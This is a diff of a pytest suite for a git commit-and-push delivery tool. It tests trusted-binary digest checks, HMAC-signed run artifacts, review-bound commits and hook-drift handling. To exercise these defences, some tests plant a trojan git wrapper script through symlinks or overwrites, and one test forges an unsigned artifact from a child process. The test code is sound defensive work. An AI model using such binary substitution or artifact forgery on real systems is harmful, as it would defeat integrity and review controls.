+        return subprocess.CompletedProcess(cmd, 0, '{"ok": true}\n', "")
+
+    monkeypatch.setattr(globals_["subprocess"], "run", fake_run)
+    args = argparse.Namespace(
+        repo=None, plugin_root=None, relay_role=None, relay_config=None,
+        relay_role_timeout=90, pr=None, pr_grind_timeout=180,
+        litmus_status_timeout=60, base=None, drift_baseline=None,
+        phase0_status_timeout=60, busdriver_state_dir_name=None,
+        pr_grind_result_file=None, delivery_status_timeout=180,
+    )
+
+    data, rc = ns["run_delivery_status"](args)
+
+    assert rc == 0
+    assert data == {"ok": True}
+    assert calls[0][:2] == [sys.executable, "-I"]
+
+
+def test_delivery_status_private_marker_fails_closed_when_runtime_bin_disappears(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+
+    class CP:
+        stdout = json.dumps({"ok": False, "error": "private_trusted_bin_unavailable"})
+        stderr = ""
+        returncode = 2
+
+    def fake_run(cmd, **kwargs):
+        runtime_root = Path(cmd[2]).parents[1]
+        runtime_bin = runtime_root / "trusted-bin"
+        assert kwargs["env"]["HERMES_BUSDRIVER_PRIVATE_RUNTIME"] == "1"
+        for child in runtime_bin.iterdir():
+            child.unlink()
+        runtime_bin.rmdir()
+        old_env = os.environ.copy()
+        try:
+            os.environ.clear()
+            os.environ.update(kwargs["env"])
+            checker = runpy.run_path(str(runtime_root / "scripts" / "hermes-busdriver-pr-grind-check"))
+            with pytest.raises(SystemExit) as exc:
+                checker["trusted_executable_path"]("git")
+            assert json.loads(str(exc.value))["error"] == "private_trusted_bin_unavailable"
+        finally:
+            os.environ.clear()
+            os.environ.update(old_env)
+        return CP()
+
+    monkeypatch.setattr(ns["subprocess"], "run", fake_run)
+    args = argparse.Namespace(
+        repo=None,
+        plugin_root=None,
+        pr=None,
+        pr_grind_result_file=None,
+        delivery_status_timeout=180,
+        litmus_base_ref=None,
+        relay_role=None,
+        relay_config=None,
+        relay_role_timeout=90,
+        relay_role_network_budget=1,
+        drift_baseline=None,
+        busdriver_state_dir_name=None,
+    )
+
+    data, rc = ns["run_delivery_status"](args)
+
+    assert rc == 2
+    assert data["error"] == "private_trusted_bin_unavailable"
+
+
+@pytest.mark.parametrize(
+    "mutation",
+    ("bin_missing", "entry_missing", "bin_symlink", "entry_symlink", "mode_tamper", "digest_tamper"),
+)
+def test_real_delivery_status_child_rejects_private_runtime_mutation_before_git(
+    monkeypatch, tmp_path: Path, mutation: str
+):
+    ns = runpy.run_path(str(PRODUCTION_DELIVER))
+    repo = init_repo(tmp_path / "repo")
+    real_run = subprocess.run
+    sentinel = tmp_path / "sentinel"
+    fallback = tmp_path / "fallback"
+    fallback.mkdir()
+
+    def wrapper(path: Path) -> None:
+        path.write_text(
+            "#!/bin/sh\n"
+            f"printf ran >> {shlex.quote(str(sentinel))}\n"
+            "exec /usr/bin/git \"$@\"\n"
+        )
+        path.chmod(0o500)
+
+    def mutate_then_run(cmd, **kwargs):
+        runtime_root = Path(cmd[2]).parents[1]
+        trusted_bin = runtime_root / "trusted-bin"
+        if mutation == "bin_missing":
+            shutil.rmtree(trusted_bin)
+        elif mutation == "entry_missing":
+            (trusted_bin / "git").unlink()
+        elif mutation == "bin_symlink":
+            shutil.rmtree(trusted_bin)
+            wrapper(fallback / "git")
+            os.symlink(fallback, trusted_bin)
+        elif mutation == "entry_symlink":
+            (trusted_bin / "git").unlink()
+            wrapper(fallback / "git")
+            os.symlink(fallback / "git", trusted_bin / "git")
+        elif mutation == "mode_tamper":
+            (trusted_bin / "git").chmod(0o700)
+        elif mutation == "digest_tamper":
+            target = trusted_bin / "git"
+            target.chmod(0o700)
+            wrapper(target)
+        return real_run(cmd, **kwargs)
+
+    monkeypatch.setattr(ns["run_delivery_status"].__globals__["subprocess"], "run", mutate_then_run)
+    args = argparse.Namespace(
+        repo=str(repo), plugin_root=str(tmp_path / "missing-plugin"), pr=None,
+        pr_grind_result_file=None, delivery_status_timeout=60,
+        litmus_base_ref=None, relay_role=None, relay_config=None,
+        relay_role_timeout=10, relay_role_network_budget=1,
+        drift_baseline=None, busdriver_state_dir_name=None,
+    )
+    data, rc = ns["run_delivery_status"](args, include_lock_status=False)
+    assert rc != 0
+    assert str(data.get("error", "")).startswith("private_trusted_")
+    assert not sentinel.exists()
+
+
+def test_dispatch_trusted_executable_is_private_immutable_copy(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(PRODUCTION_DELIVER))
+    globals_ = ns["trusted_executable_path"].__globals__
+    source = tmp_path / "mutable-git"
+    payload = b"trusted executable bytes\n"
+    source.write_bytes(payload)
+    source.chmod(0o700)
+    monkeypatch.setitem(globals_, "TRUSTED_GIT", source)
+    monkeypatch.setitem(globals_["TRUSTED_EXECUTABLE_DIGESTS"], "git", hashlib.sha256(payload).hexdigest())
+
+    private = ns["trusted_executable_path"]("git")
+
+    assert private != source
+    assert private.read_bytes() == payload
+    assert private.stat().st_mode & 0o777 == 0o500
+    assert private.parent.stat().st_mode & 0o777 == 0o700
+    source.write_bytes(b"source changed after authentication\n")
+    assert ns["trusted_executable_path"]("git") == private
+    assert private.read_bytes() == payload
+
+
+def test_direct_commit_preflight_git_edges_use_private_authenticated_path(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(PRODUCTION_DELIVER))
+    repo = tmp_path / "repo"
+    git_dir = repo / ".git"
+    (git_dir / "hooks").mkdir(parents=True)
+    private = tmp_path / "private-runtime" / "git"
+    private.parent.mkdir()
+    private.write_text("trusted git\n")
+    calls = []
+
+    class FakeCompleted:
+        def __init__(self, returncode=0, stdout=None, stderr=""):
+            self.returncode = returncode
+            self.stdout = "" if stdout is None else stdout
+            self.stderr = stderr
+
+    def fake_run(cmd, **kwargs):
+        calls.append(cmd)
+        if "--get-regexp" in cmd:
+            return FakeCompleted(returncode=1)
+        if "--git-common-dir" in cmd:
+            return FakeCompleted(stdout=str(git_dir) + "\n")
+        if "remote.origin.url" in cmd:
+            return FakeCompleted(stdout="https://github.com/owner/repo.git\n")
+        return FakeCompleted(stdout=b"" if kwargs.get("capture_output") else "")
+
+    globals_ = ns["git_mutation_config_safety"].__globals__
+    monkeypatch.setitem(globals_, "trusted_executable_path", lambda _name: private)
+    monkeypatch.setattr(globals_["subprocess"], "run", fake_run)
+
+    assert ns["git_mutation_config_safety"](repo) == (True, None)
+    assert ns["github_remote_url"](repo) == "https://github.com/owner/repo.git"
+    assert ns["staged_marker_entries"](repo, {".claude"}) == []
+    assert calls
+    assert all(Path(cmd[0]) == private for cmd in calls)
 
 
 def test_malformed_verifier_command_preserves_user_label(tmp_path: Path):
@@ -1598,7 +2329,8 @@ def test_git_output_disables_fsmonitor_and_global_git_config(monkeypatch, tmp_pa
     assert rc == 0
     assert out == " M .claude/litmus-passed.local"
     assert err == " warning with leading space"
-    assert captured["cmd"][:5] == ["git", "-C", str(repo), "-c", "core.fsmonitor=false"]
+    assert Path(captured["cmd"][0]).name == "git"
+    assert captured["cmd"][1:5] == ["-C", str(repo), "-c", "core.fsmonitor=false"]
     assert captured["env"]["GIT_CONFIG_GLOBAL"] == os.devnull
     assert captured["env"]["GIT_CONFIG_NOSYSTEM"] == "1"
 
@@ -1612,15 +2344,318 @@ def test_staged_diff_hash_uses_full_diff_bytes(tmp_path: Path):
     assert ns["staged_diff_hash"](repo) == __import__("hashlib").sha256(diff.encode()).hexdigest()
 
 
+def test_all_commit_diff_evidence_executes_private_authenticated_git(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(PRODUCTION_DELIVER))
+    private_root = tmp_path / "private"
+    private_root.mkdir(mode=0o700)
+    private_git = private_root / "git"
+    private_git.write_bytes(b"authenticated git\n")
+    private_git.chmod(0o500)
+    seen: list[list[str]] = []
+
+    class CP:
+        returncode = 0
+        stdout = b"reviewed diff\n"
+        stderr = b""
+
+    def fake_trusted(name: str) -> Path:
+        assert name == "git"
+        return private_git
+
+    def fake_run(cmd, **_kwargs):
+        seen.append(cmd)
+        return CP()
+
+    globals_ = ns["staged_diff_hash"].__globals__
+    monkeypatch.setitem(globals_, "trusted_executable_path", fake_trusted)
+    monkeypatch.setattr(globals_["subprocess"], "run", fake_run)
+    repo = tmp_path / "repo"
+    repo.mkdir()
+    assert ns["staged_diff_hash"](repo)
+    assert ns["reviewed_tree_diff_hash"](repo, "a" * 40, "b" * 40)
+    assert ns["diff_hash"](repo, "HEAD")
+    assert len(seen) == 3
+    assert all(Path(cmd[0]) == private_git for cmd in seen)
+
+
+def test_commit_staged_index_rejects_index_changed_after_review_binding(tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-commit-binding")
+    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
+    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
+    (repo / "tracked.txt").write_text("one\n")
+    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
+    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
+    (repo / "tracked.txt").write_text("reviewed\n")
+    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
+    expected_parent = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
+    expected_tree = run(["git", "write-tree"], repo).stdout.strip()
+
+    (repo / "tracked.txt").write_text("unreviewed\n")
+    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
+    effect = ns["commit_staged_index"](
+        repo,
+        "must not commit drift",
+        {"BUSDRIVER_STATE_DIR": ".claude"},
+        expected_parent_head=expected_parent,
+        expected_tree=expected_tree,
+    )
+
+    assert effect["ok"] is False
+    assert effect["error"] == "commit_index_changed_after_review"
+    assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == expected_parent
+
+
+def test_artifact_validator_rejects_authority_positive_mutating_run(tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    run_id = "mutating-artifact-1"
+    args = argparse.Namespace(run_id=run_id, pr=None)
+    authority = ns["mutating_authority"]("commit", True, "committed", ["test"])
+    mutating_run = ns["mutating_run_envelope"](
+        args,
+        "commit",
+        "committed",
+        "committed",
+        tmp_path,
+        authority,
+        [{"name": "git_commit", "ok": True}],
+        {"acquired": True},
+        {"released": True},
+    )
+    false_flags = {key: False for key in BLOCKED_KEYS}
+    payload = {
+        "schema": "hermes-busdriver-deliver/v0",
+        "version": 1,
+        "ok": True,
+        "mode": "execute",
+        "operation": "commit",
+        "decision": {"status": "committed", "reason": "committed", **false_flags},
+        "run": {
+            "schema": "hermes-busdriver-delivery-run/v0",
+            "version": 1,
+            "run_id": run_id,
+            "created_at": "2026-07-10T00:00:00Z",
+            "phase": "commit",
+            "status": "committed",
+            "reason": "committed",
+            "repo_root": str(tmp_path),
+            "pr_number": None,
+            "authority": false_flags,
+            "artifacts": [],
+        },
+        "mutating_run": mutating_run,
+    }
+    assert ns["artifact_is_valid"](payload, run_id) is True
+    payload["mutating_run"]["authority"]["merge_allowed"] = True
+    assert ns["artifact_is_valid"](payload, run_id) is False
+
+
+def test_artifact_validator_rejects_cross_envelope_outcome_and_phase_mismatches(tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    run_id = "artifact-correlation-1"
+    false_flags = {key: False for key in BLOCKED_KEYS}
+    valid = {
+        "schema": "hermes-busdriver-deliver/v0",
+        "version": 1,
+        "ok": True,
+        "mode": "execute",
+        "operation": "verify",
+        "decision": {"status": "verified", "reason": "verified", **false_flags},
+        "run": {
+            "schema": "hermes-busdriver-delivery-run/v0",
+            "version": 1,
+            "run_id": run_id,
+            "created_at": "2026-07-15T00:00:00Z",
+            "phase": "verify",
+            "status": "verified",
+            "reason": "verified",
+            "repo_root": str(tmp_path),
+            "pr_number": None,
+            "authority": false_flags,
+            "artifacts": [],
+        },
+        "mutating_run": None,
+    }
+    assert ns["artifact_is_valid"](valid, run_id) is True
+
+    mutations = {
+        "decision_status": lambda data: data["decision"].update(status="blocked"),
+        "decision_reason": lambda data: data["decision"].update(reason="verifier_failed"),
+        "run_status": lambda data: data["run"].update(status="blocked"),
+        "run_reason": lambda data: data["run"].update(reason="verifier_failed"),
+        "ok": lambda data: data.update(ok=False),
+        "mode": lambda data: data.update(mode="status"),
+        "operation": lambda data: data.update(operation="commit"),
+        "phase": lambda data: data["run"].update(phase="commit"),
+    }
+    for label, mutate in mutations.items():
+        candidate = json.loads(json.dumps(valid))
+        mutate(candidate)
+        assert ns["artifact_is_valid"](candidate, run_id) is False, label
+
+
+def test_process_external_artifact_requires_complete_authentication_shape(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(PRODUCTION_DELIVER))
+    artifact_dir = tmp_path / "delivery-runs"
+    artifact_dir.mkdir(mode=0o700)
+    monkeypatch.setenv(ARTIFACT_ENV, str(artifact_dir))
+    run_id = "external-auth-shape"
+    false_flags = {key: False for key in BLOCKED_KEYS}
+    payload = {
+        "schema": "hermes-busdriver-deliver/v0",
+        "version": 1,
+        "ok": True,
+        "mode": "execute",
+        "operation": "verify",
+        "decision": {"status": "verified", "reason": "verified", **false_flags},
+        "run": {
+            "schema": "hermes-busdriver-delivery-run/v0",
+            "version": 1,
+            "run_id": run_id,
+            "created_at": "2026-07-15T00:00:00Z",
+            "phase": "verify",
+            "status": "verified",
+            "reason": "verified",
+            "repo_root": str(tmp_path),
+            "pr_number": None,
+            "authority": false_flags,
+            "artifacts": [],
+        },
+        "mutating_run": None,
+        "writer_authentication": {
+            "schema": "hermes-busdriver-delivery-artifact-auth/v1",
+            "algorithm": "hmac-sha256-process-scoped",
+            "key_id": "a" * 32,
+            "mac": "b" * 64,
+        },
+    }
+    artifact = artifact_dir / "external.json"
+    artifact.write_text(json.dumps(payload))
+    artifact.chmod(0o600)
+    assert ns["has_process_external_artifact"](run_id) is True
+
+    for invalid_mac in (None, "short", "z" * 64):
+        malformed = json.loads(json.dumps(payload))
+        if invalid_mac is None:
+            malformed["writer_authentication"].pop("mac")
+        else:
+            malformed["writer_authentication"]["mac"] = invalid_mac
+        artifact.write_text(json.dumps(malformed))
+        artifact.chmod(0o600)
+        assert ns["has_process_external_artifact"](run_id) is False
+
+
+def test_status_lookup_rejects_schema_valid_unsigned_forged_artifact(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(PRODUCTION_DELIVER))
+    artifact_dir = tmp_path / "delivery-runs"
+    artifact_dir.mkdir(mode=0o700)
+    monkeypatch.setenv(ARTIFACT_ENV, str(artifact_dir))
+    run_id = "forged-run"
+    false_flags = {key: False for key in BLOCKED_KEYS}
+    forged = {
+        "schema": "hermes-busdriver-deliver/v0",
+        "version": 1,
+        "ok": True,
+        "mode": "execute",
+        "operation": "verify",
+        "decision": {"status": "verified", "reason": "verified", **false_flags},
+        "run": {
+            "schema": "hermes-busdriver-delivery-run/v0",
+            "version": 1,
+            "run_id": run_id,
+            "created_at": "2026-07-13T00:00:00Z",
+            "phase": "verify",
+            "status": "verified",
+            "reason": "verified",
+            "repo_root": str(tmp_path),
+            "pr_number": None,
+            "authority": false_flags,
+            "artifacts": [],
+        },
+        "mutating_run": None,
+    }
+    forged_path = artifact_dir / "20990101-000000-forged.json"
+    forged_path.write_text(json.dumps(forged))
+    forged_path.chmod(0o600)
+    assert ns["artifact_is_valid"](forged, run_id) is True
+    assert ns["artifact_for_run_id"](run_id) is None
+
+
+def test_artifact_signing_capability_is_parent_memory_only(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(PRODUCTION_DELIVER))
+    artifact_dir = tmp_path / "delivery-runs"
+    monkeypatch.setenv(ARTIFACT_ENV, str(artifact_dir))
+    run_id = "parent-memory-run"
+    false_flags = {key: False for key in BLOCKED_KEYS}
+    payload = {
+        "schema": "hermes-busdriver-deliver/v0",
+        "version": 1,
+        "ok": True,
+        "mode": "execute",
+        "operation": "verify",
+        "decision": {"status": "verified", "reason": "verified", **false_flags},
+        "run": {
+            "schema": "hermes-busdriver-delivery-run/v0",
+            "version": 1,
+            "run_id": run_id,
+            "created_at": "2026-07-14T00:00:00Z",
+            "phase": "verify",
+            "status": "verified",
+            "reason": "verified",
+            "repo_root": str(tmp_path),
+            "pr_number": None,
+            "authority": false_flags,
+            "artifacts": [],
+        },
+        "mutating_run": None,
+    }
+    ns["write_artifact"](payload)
+    assert ns["artifact_for_run_id"](run_id) is not None
+    assert not (tmp_path / ".hermes-busdriver-delivery-auth").exists()
+    assert not list(tmp_path.rglob("artifact-hmac.key"))
+
+    code = (
+        "import runpy,sys; "
+        f"ns=runpy.run_path({str(PRODUCTION_DELIVER)!r}); "
+        f"sys.exit(0 if ns['artifact_for_run_id']({run_id!r}) is None else 9)"
+    )
+    child = subprocess.run(
+        [sys.executable, "-I", "-c", code],
+        text=True,
+        capture_output=True,
+        env={ARTIFACT_ENV: str(artifact_dir), "HOME": str(tmp_path)},
+        check=False,
+    )
+    assert child.returncode == 0
+
+    written = next(artifact_dir.glob("*.json"))
+    forge_code = (
+        "import json,os,runpy; "
+        f"os.environ[{ARTIFACT_ENV!r}]={str(artifact_dir)!r}; "
+        f"n=runpy.run_path({str(PRODUCTION_DELIVER)!r}); "
+        f"d=json.loads(open({str(written)!r}).read()); "
+        "d.pop('writer_authentication',None); "
+        "d['decision']['reason']='same-uid-child-forgery'; "
+        f"[os.unlink(str(x)) for x in __import__('pathlib').Path({str(artifact_dir)!r}).glob('*.json')]; "
+        "n['write_artifact'](d)"
+    )
+    forged = subprocess.run([sys.executable, "-I", "-c", forge_code], text=True, capture_output=True)
+    assert forged.returncode == 0, forged.stderr
+    assert ns["artifact_for_run_id"](run_id) is None
+
+
 def test_live_remote_branch_head_preserves_credentials_env(monkeypatch, tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     captured = {}
 
     class CP:
-        returncode = 0; stdout = "abc123\trefs/heads/feature\n"; stderr = ""
+        returncode = 0
+        stdout = "abc123\trefs/heads/feature\n"
+        stderr = ""
 
     def fake_run(_cmd, **kwargs):
-        captured.update(env=kwargs.get("env")); return CP()
+        captured.update(env=kwargs.get("env"))
+        return CP()
 
     monkeypatch.setenv("SSH_AUTH_SOCK", "/tmp/agent.sock")
     monkeypatch.setattr(ns["live_remote_branch_head"].__globals__["subprocess"], "run", fake_run)
@@ -1633,7 +2668,9 @@ def test_commit_marker_state_dirs_include_default_claude_and_opencode(tmp_path: 
     repo = init_repo(tmp_path / "repo")
     markers = [".claude/pr-backstop-verdict.local.json", ".claude/pr-grind-clean.local", ".opencode/pr-backstop-verdict.local.json", ".opencode/skip-litmus.local"]
     for path in markers:
-        marker = repo / path; marker.parent.mkdir(exist_ok=True); marker.write_text("{}\n")
+        marker = repo / path
+        marker.parent.mkdir(exist_ok=True)
+        marker.write_text("{}\n")
         assert run(["git", "add", path], repo).returncode == 0
 
     args = type("Args", (), {"busdriver_state_dir_name": None})()
@@ -1646,7 +2683,9 @@ def test_staged_marker_entries_detects_marker_renames_with_rename_detection_enab
     repo = init_repo(tmp_path / "repo")
     for key, value in (("user.email", "test@example.test"), ("user.name", "Test User")):
         assert run(["git", "config", key, value], repo).returncode == 0
-    marker = repo / ".claude" / "litmus-passed.local"; marker.parent.mkdir(); marker.write_text("reviewed\n")
+    marker = repo / ".claude" / "litmus-passed.local"
+    marker.parent.mkdir()
+    marker.write_text("reviewed\n")
     assert run(["git", "add", ".claude/litmus-passed.local"], repo).returncode == 0
     assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
     assert run(["git", "config", "--local", "diff.renames", "true"], repo).returncode == 0
@@ -1654,19 +2693,28 @@ def test_staged_marker_entries_detects_marker_renames_with_rename_detection_enab
     assert ns["staged_marker_entries"](repo, (".claude", ".opencode")) == [".claude/litmus-passed.local"]
 
 
-def test_push_command_keeps_hooks_enabled_with_exact_remote_lease(tmp_path: Path):
+def test_github_slug_from_remote_url_accepts_only_supported_github_shapes():
+    ns = runpy.run_path(str(DELIVER))
+
+    assert ns["github_slug_from_remote_url"]("https://github.com/owner/repo.git") == "owner/repo"
+    assert ns["github_slug_from_remote_url"]("git@github.com:owner/repo.git") == "owner/repo"
+    assert ns["github_slug_from_remote_url"]("ssh://git@github.com/owner/repo") == "owner/repo"
+    assert ns["github_slug_from_remote_url"]("https://example.test/owner/repo.git") is None
+
+
+def test_push_command_disables_hooks_with_exact_remote_lease(tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     repo = init_repo(tmp_path / "repo")
 
     cmd = ns["push_command"](repo, "origin", "feature", None, "abc123")
 
-    assert "--no-verify" not in cmd
+    assert cmd[:4] == ["git", "-c", f"core.hooksPath={os.devnull}", "push"]
     assert "--no-follow-tags" in cmd
     assert "--force-with-lease=refs/heads/feature:" in cmd
     assert cmd[-2:] == ["origin", "abc123:refs/heads/feature"]
 
 
-def test_commit_staged_index_restores_reviewed_tree_when_hook_fails_after_mutation(tmp_path: Path):
+def test_commit_staged_index_preserves_hook_mutation_for_manual_reconciliation(tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     repo = init_repo(tmp_path / "repo-hook-fail")
     assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
@@ -1685,11 +2733,13 @@ def test_commit_staged_index_restores_reviewed_tree_when_hook_fails_after_mutati
 
     assert effect["ok"] is False
     assert effect["error"] == "git_commit_failed_or_hook_drift"
-    assert effect["restore_reviewed_index_ok"] is True
-    assert effect["restore_reviewed_worktree_ok"] is True
+    assert effect["restore_reviewed_index_ok"] is False
+    assert effect["restore_reviewed_worktree_ok"] is False
+    assert effect["reconciliation_required"] is True
+    assert effect["worktree_index_preserved"] is True
     assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == before
-    assert run(["git", "write-tree"], repo).stdout.strip() == effect["expected_tree"]
-    assert (repo / "tracked.txt").read_text() == "reviewed\n"
+    assert run(["git", "write-tree"], repo).stdout.strip() != effect["expected_tree"]
+    assert (repo / "tracked.txt").read_text() == "hook-mutated-before-fail\n"
 
 
 def test_commit_staged_index_blocks_preexisting_untracked_reviewed_deletion_replacement(tmp_path: Path):
@@ -1713,7 +2763,7 @@ def test_commit_staged_index_blocks_preexisting_untracked_reviewed_deletion_repl
     assert any(substep["name"] == "git_pre_commit_reviewed_untracked_worktree_check" for substep in effect["substeps"])
 
 
-def test_commit_staged_index_cleans_untracked_reviewed_deletion_after_failed_hook(tmp_path: Path):
+def test_commit_staged_index_preserves_untracked_hook_recreation_after_failure(tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     repo = init_repo(tmp_path / "repo-hook-delete-untracked")
     assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
@@ -1729,12 +2779,13 @@ def test_commit_staged_index_cleans_untracked_reviewed_deletion_after_failed_hoo
     effect = ns["commit_staged_index"](repo, "delete file", {"BUSDRIVER_STATE_DIR": ".claude"})
 
     assert effect["ok"] is False
-    assert effect["restore_reviewed_worktree_ok"] is True
-    assert not (repo / "tracked.txt").exists()
-    assert any(substep["name"] in {"git_clean_reviewed_untracked_failed_commit_drift", "git_clean_reviewed_deleted_paths_from_worktree"} for substep in effect["substeps"])
+    assert effect["reconciliation_required"] is True
+    assert effect["worktree_index_preserved"] is True
+    assert (repo / "tracked.txt").read_text() == "hook-recreated-untracked\n"
+    assert not any(substep["name"].startswith("git_clean") for substep in effect["substeps"])
 
 
-def test_commit_staged_index_restores_reviewed_deletion_when_hook_recreates_file(tmp_path: Path):
+def test_commit_staged_index_preserves_staged_hook_recreation_after_failure(tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     repo = init_repo(tmp_path / "repo-hook-delete")
     assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
@@ -1751,14 +2802,15 @@ def test_commit_staged_index_restores_reviewed_deletion_when_hook_recreates_file
     effect = ns["commit_staged_index"](repo, "delete file", {"BUSDRIVER_STATE_DIR": ".claude"})
 
     assert effect["ok"] is False
-    assert effect["restore_reviewed_index_ok"] is True
-    assert effect["restore_reviewed_worktree_ok"] is True
+    assert effect["restore_reviewed_index_ok"] is False
+    assert effect["restore_reviewed_worktree_ok"] is False
+    assert effect["reconciliation_required"] is True
     assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == before
-    assert run(["git", "write-tree"], repo).stdout.strip() == effect["expected_tree"]
-    assert not (repo / "tracked.txt").exists()
+    assert run(["git", "write-tree"], repo).stdout.strip() != effect["expected_tree"]
+    assert (repo / "tracked.txt").read_text() == "hook-recreated\n"
 
 
-def test_commit_staged_index_restores_reviewed_deletion_without_combined_restore_pathspec_abort(monkeypatch, tmp_path: Path):
+def test_commit_staged_index_does_not_call_restore_after_failed_hook(monkeypatch, tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     repo = init_repo(tmp_path / "repo-hook-delete-pathspec-abort")
     assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
@@ -1784,14 +2836,16 @@ def test_commit_staged_index_restores_reviewed_deletion_without_combined_restore
     effect = ns["commit_staged_index"](repo, "delete file", {"BUSDRIVER_STATE_DIR": ".claude"})
 
     assert effect["ok"] is False
-    assert effect["restore_reviewed_index_ok"] is True
-    assert effect["restore_reviewed_worktree_ok"] is True
+    assert effect["restore_reviewed_index_ok"] is False
+    assert effect["restore_reviewed_worktree_ok"] is False
+    assert effect["reconciliation_required"] is True
     assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == before
-    assert run(["git", "write-tree"], repo).stdout.strip() == effect["expected_tree"]
-    assert not (repo / "tracked.txt").exists()
+    assert run(["git", "write-tree"], repo).stdout.strip() != effect["expected_tree"]
+    assert (repo / "tracked.txt").read_text() == "hook-recreated\n"
+    assert not any(substep["name"].startswith("git_restore") for substep in effect["substeps"])
 
 
-def test_commit_staged_index_batches_many_reviewed_path_restores(tmp_path: Path):
+def test_commit_staged_index_preserves_many_reviewed_paths_without_restore(tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     repo = init_repo(tmp_path / "repo-many-reviewed-paths")
     assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
@@ -1811,13 +2865,11 @@ def test_commit_staged_index_batches_many_reviewed_path_restores(tmp_path: Path)
     effect = ns["commit_staged_index"](repo, "many paths", {"BUSDRIVER_STATE_DIR": ".claude"})
 
     assert effect["ok"] is False
-    assert effect["restore_reviewed_index_ok"] is True
-    assert effect["restore_reviewed_worktree_ok"] is True
-    restore_index = next(substep for substep in effect["substeps"] if substep["name"] == "git_restore_reviewed_index")
-    assert restore_index["batch_count"] > 1
-    restore_batches = [substep for substep in effect["substeps"] if substep["name"] == "git_restore_reviewed_index_batch"]
-    assert restore_batches
-    assert all(substep["path_count"] <= 100 for substep in restore_batches)
+    assert effect["restore_reviewed_index_ok"] is False
+    assert effect["restore_reviewed_worktree_ok"] is False
+    assert effect["reconciliation_required"] is True
+    assert all((repo / f"file-{index:03d}.txt").read_text() == "reviewed\n" for index in range(105))
+    assert not any(substep["name"].startswith("git_restore") for substep in effect["substeps"])
 
 
 def test_commit_staged_index_detects_modified_preexisting_untracked_file(tmp_path: Path):
@@ -1838,7 +2890,7 @@ def test_commit_staged_index_detects_modified_preexisting_untracked_file(tmp_pat
     effect = ns["commit_staged_index"](repo, "detect untracked modification", {"BUSDRIVER_STATE_DIR": ".claude"})
 
     assert effect["ok"] is True
-    assert effect["warning"] == "post_commit_untracked_dirty"
+    assert effect["warning"] == "post_commit_concurrent_work_preserved"
     assert (repo / "note.tmp").read_text() == "modified untracked note\n"
 
 
@@ -1859,6 +2911,36 @@ def test_commit_staged_index_allows_preexisting_unrelated_untracked_file(tmp_pat
     assert effect["ok"] is True
     assert (repo / "note.tmp").read_text() == "untracked note\n"
     assert run(["git", "log", "-1", "--format=%s"], repo).stdout.strip() == "allow unrelated untracked"
+
+
+def test_commit_staged_index_rejects_untracked_added_after_reviewed_baseline(tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-reviewed-untracked-baseline")
+    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
+    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
+    (repo / "tracked.txt").write_text("one\n")
+    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
+    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
+    (repo / "reviewed.tmp").write_text("reviewed untracked\n")
+    (repo / "tracked.txt").write_text("reviewed\n")
+    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
+    reviewed_status = run(["git", "status", "--porcelain=v1", "--untracked-files=all"], repo).stdout
+    reviewed_untracked = {"reviewed.tmp": ns["untracked_file_identity"](repo, "reviewed.tmp")}
+    (repo / "inserted.tmp").write_text("not reviewed\n")
+
+    effect = ns["commit_staged_index"](
+        repo,
+        "reject inserted untracked",
+        reviewed_status=reviewed_status,
+        reviewed_untracked_snapshot=reviewed_untracked,
+        disable_hooks=True,
+    )
+
+    assert effect["ok"] is False
+    assert effect["error"] == "pre_commit_status_changed_after_review"
+    assert (repo / "reviewed.tmp").read_text() == "reviewed untracked\n"
+    assert (repo / "inserted.tmp").read_text() == "not reviewed\n"
+    assert run(["git", "log", "-1", "--format=%s"], repo).stdout.strip() == "init"
 
 
 def test_commit_staged_index_allows_large_preexisting_unrelated_untracked_file(tmp_path: Path):
@@ -1938,7 +3020,7 @@ def test_commit_staged_index_detects_marker_drift_without_generic_untracked_iden
     effect = ns["commit_staged_index"](repo, "marker drift", {"BUSDRIVER_STATE_DIR": ".claude"})
 
     assert effect["ok"] is True
-    assert effect["warning"] == "post_commit_untracked_dirty"
+    assert effect["warning"] == "post_commit_concurrent_work_preserved"
     assert ".claude/litmus-passed.local" in effect["post_commit_dirty_paths"]
 
 
@@ -1962,7 +3044,55 @@ def test_commit_staged_index_blocks_preexisting_unstaged_reviewed_file_dirty(tmp
